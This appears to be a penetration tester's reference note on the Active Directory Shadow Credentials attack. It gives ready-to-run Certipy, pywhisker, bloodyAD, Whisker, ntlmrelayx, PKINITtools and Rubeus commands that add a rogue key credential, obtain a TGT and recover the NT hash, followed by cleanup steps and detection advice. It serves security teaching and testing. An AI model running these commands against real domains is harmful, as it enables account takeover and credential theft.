---
created: 2026-08-20
updated: 2026-10-14
tags:
  - AD
  - AD_attacks
---
## Shadow Credentials

>[!important] Objective: **take control of a target user or computer account by writing an attacker-controlled key credential to its `msDS-KeyCredentialLink` attribute, then authenticating as that account via Kerberos `PKINIT` — without resetting its password**.

> A **Shadow Credentials** attack abuses the `msDS-KeyCredentialLink` attribute of a target account. An attacker with write access to this attribute adds a public key they control, then uses the matching private key to authenticate as the account through Kerberos `PKINIT`, recovering a Kerberos TGT and the account's NT hash.

### Key Trust and `msDS-KeyCredentialLink`

- `msDS-KeyCredentialLink` is a multi-valued AD attribute that stores **key credentials** — raw public keys, packaged as `KeyCredential` structures, bound to an account.
- It underpins **Key Trust** authentication, the passwordless mechanism behind Windows Hello for Business and Azure AD device registration. During `PKINIT`, the KDC matches the certificate the client presents against a public key stored in the account's `msDS-KeyCredentialLink`; if they match, it issues a TGT.
- The KDC trusts any key listed in the attribute. Writing a rogue public key therefore adds an alternate credential for the account, usable for authentication alongside the real password.


### Why it works

- `PKINIT` performs initial Kerberos authentication with a certificate instead of a password.
- The KDC authorizes based on the key stored in the directory, not on how that key was added. An attacker who can write the attribute controls an accepted key.
- Authentication succeeds with the attacker's private key, so no password change is required. The legitimate password keeps working and the account owner sees nothing unusual.

### UnPAC-the-hash

- When an account authenticates via `PKINIT`, the KDC embeds the account's NT hash in the TGT's PAC (`PAC_CREDENTIAL_INFO`), encrypted under the AS-REP session key, so the account can still fall back to NTLM.
- Recovering that hash from the TGT is known as **UnPAC-the-hash**. It converts a one-time certificate into the account's reusable NT hash, enabling [[Pass-the-Hash]] and offline cracking.

### Shadow Credentials vs. password reset

- Compared with resetting the target's password (e.g., via `GenericAll` or `ForceChangePassword`), Shadow Credentials is:
	- **Non-destructive** -> the account's password is unchanged, so dependent services and the legitimate user keep working.
	- **Stealthier** -> no password-reset event; the change is a single attribute write.
	- **Reversible** -> removing the added key credential restores the original state.
	- **More useful** -> UnPAC-the-hash yields reusable credential material (the NT hash), not just a single session.
	- **Applicable to computer accounts** -> machine accounts can't be meaningfully password-reset, but their `msDS-KeyCredentialLink` can be abused the same way.

### Requirements

- **Write access** to the target's `msDS-KeyCredentialLink` — `GenericAll`, `GenericWrite`, `WriteProperty` on the attribute, or object ownership. BloodHound renders this as the `AddKeyCredentialLink` edge.
- **A DC that supports `PKINIT`** — the domain needs at least one Domain Controller with a certificate for KDC/Domain Controller authentication (i.e., AD CS is deployed). Without it, `PKINIT` fails.
- **A DC on Windows Server 2016 or later** — Key Trust account mapping was introduced in 2016; earlier DCs ignore the attribute.

>[!warning] If no DC holds a suitable certificate, the `PKINIT` step fails with `KDC_ERR_PADATA_TYPE_NOSUPP`. The key-credential write still succeeds, but the key can't be used for `PKINIT`. In that case, authenticate the certificate against LDAPS over Schannel instead (`PassTheCert`). See [[🛠️ Pass-the-Certificate]].

### Enumeration

>[!note] See [[AD ACL attacks]] for full ACL enumeration.

- In BloodHound, look for the `AddKeyCredentialLink` edge from a principal you control to a target user or computer. See [[🛠️ BloodHound]].
- `GenericAll` and `GenericWrite` on the target also permit the write, since both include `msDS-KeyCredentialLink`.

- Confirm write access on the attribute via PowerView:

```powershell
Get-DomainObjectAcl -Identity 'TARGET$' -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match 'Key-Credential' }
```

- List objects the controlled account can write via `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' get writable --otype COMPUTER --right WRITE --detail
```

## Performing the attack

- The attack proceeds in three stages:
	- Add an attacker-controlled key credential to the target's `msDS-KeyCredentialLink`.
	- Request a TGT via `PKINIT` using the matching private key.
	- Recover the account's NT hash from the TGT (UnPAC-the-hash).
- Certipy's `shadow auto` performs all three stages and restores the attribute automatically.

### All-in-one: Certipy (Linux)

- Add a key credential, authenticate via `PKINIT`, recover the NT hash, then restore the attribute:

```bash
certipy shadow auto -u jdoe@example.com -p 'passwd123' -account targetuser -dc-ip 10.10.11.5
```

>[!note] For a computer target, pass the account with a trailing `$` (e.g., `-account 'TARGET$'`).

| Action   | Description                                                                 |
| :------- | :-------------------------------------------------------------------------- |
| `auto`   | Add a key credential, authenticate, recover the NT hash, then restore the attribute. |
| `add`    | Add a key credential and save the certificate to a `.pfx` file.            |
| `list`   | List the key credentials on the target.                                    |
| `remove` | Remove a specific key credential by device ID.                             |
| `clear`  | Remove all key credentials from the target.                                |

### Adding the key credential

- `pywhisker` (Linux):

```bash
pywhisker.py -d example.com -u jdoe -p 'passwd123' --target targetuser --action add
```

```bash
pywhisker.py -d example.com -u jdoe -p 'passwd123' --target rroe --action 'add'
```

- `bloodyAD` (Linux):

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' add shadowCredentials targetuser
```

- `Whisker` (Windows):

```cmd
Whisker.exe add /target:targetuser /domain:example.com /dc:dc01.example.com
```

- `ntlmrelayx.py` (Linux), when you can coerce the victim but can't authenticate directly — relay the authentication to LDAPS and write the key credential:

```bash
ntlmrelayx.py -t ldaps://dc01.example.com --shadow-credentials --shadow-target 'targetuser'
```

>[!note] `pywhisker` and `Whisker` output a `.pfx` file, its password, and a ready-to-run command for the next stage. Record the device ID they report — you'll need it for cleanup.

| Action   | Description                                                      |
| :------- | :-------------------------------------------------------------- |
| `add`    | Generate a key pair and add a key credential to the target.    |
| `list`   | List the key credentials on the target.                        |
| `info`   | Show the details of a specific key credential.                 |
| `remove` | Remove a key credential by device ID.                          |
| `clear`  | Remove all key credentials from the target.                    |
| `export` | Export the existing key credentials.                           |

### Requesting a TGT via `PKINIT`

- `gettgtpkinit.py` (Linux, [PKINITtools](https://github.com/dirkjanm/PKINITtools)):

```bash
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass 'PFX_PASSWORD' -dc-ip 10.10.11.5 example.com/targetuser targetuser.ccache
```

>[!note] Record the AS-REP encryption key printed by `gettgtpkinit.py` — it's required for UnPAC-the-hash in the next stage.

### Recovering the NT hash

- `getnthash.py` (Linux, PKINITtools) reads the TGT from `KRB5CCNAME` and uses the AS-REP key to extract the NT hash:

```bash
export KRB5CCNAME=targetuser.ccache
getnthash.py -key <AS-REP_key> example.com/targetuser
```

- `Rubeus` (Windows) requests the TGT and recovers the NT hash in one step. `/getcredentials` performs UnPAC-the-hash:

```cmd
Rubeus.exe asktgt /user:targetuser /certificate:targetuser.pfx /password:PFX_PASSWORD /getcredentials /nowrap
```

>[!note] `Whisker` emits this exact `Rubeus` command after adding the key credential.

## Using the result

- **TGT** -> [[Pass-the-Ticket]] to access services as the target. If the target is a Domain Controller or privileged account, proceed to [[DCSync]].
- **NT hash** -> [[Pass-the-Hash]] for authentication, [[Overpass-the-Hash]] to request fresh Kerberos tickets, or offline cracking (hashcat mode `1000`).
- **`krbtgt` hash** (via DCSync against a DC account) -> forge a [[Golden Ticket]] for domain-wide persistence.

## Cleanup

>[!warning] Remove the key credential you added. Leaving it in place is both a persistence artifact and a detection signal.

- `certipy shadow auto` restores the attribute automatically. Otherwise, remove only the entry you added.

- List existing entries first, so you don't delete legitimate Windows Hello keys:

```bash
pywhisker.py -d example.com -u jdoe -p 'passwd123' --target targetuser --action list
```

- Remove the added entry by device ID via `pywhisker`:

```bash
pywhisker.py -d example.com -u jdoe -p 'passwd123' --target targetuser --action remove --device-id <DeviceID>
```

- Remove via `Whisker`:

```cmd
Whisker.exe remove /target:targetuser /domain:example.com /dc:dc01.example.com /deviceid:<DeviceID>
```

- Remove via `bloodyAD`:

```bash
bloodyAD --host dc01.example.com -d example.com -u jdoe -p 'passwd123' remove shadowCredentials targetuser --key <DeviceID>
```

## Detection and mitigation

- Monitor directory changes to `msDS-KeyCredentialLink` (Directory Service modification event `5136`). Key credentials are normally written by device registration or Windows Hello enrollment, not by a user or admin modifying another account.
- Audit and restrict write permissions on the attribute; review `AddKeyCredentialLink` edges in BloodHound.
- Watch for `PKINIT` authentication (event `4768` with certificate information) from unexpected hosts.

## References and further reading

- [`Shadow Credentials — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
- [`Shadow Credentials: Abusing Key Trust Account Mapping — SpecterOps`](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [`msDS-KeyCredentialLink attribute — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c)
- [`Whisker — GitHub`](https://github.com/eladshamir/Whisker)
- [`pyWhisker — GitHub`](https://github.com/ShutdownRepo/pywhisker)
- [`Certipy — GitHub`](https://github.com/ly4k/Certipy)
- [`PKINITtools — GitHub`](https://github.com/dirkjanm/PKINITtools)
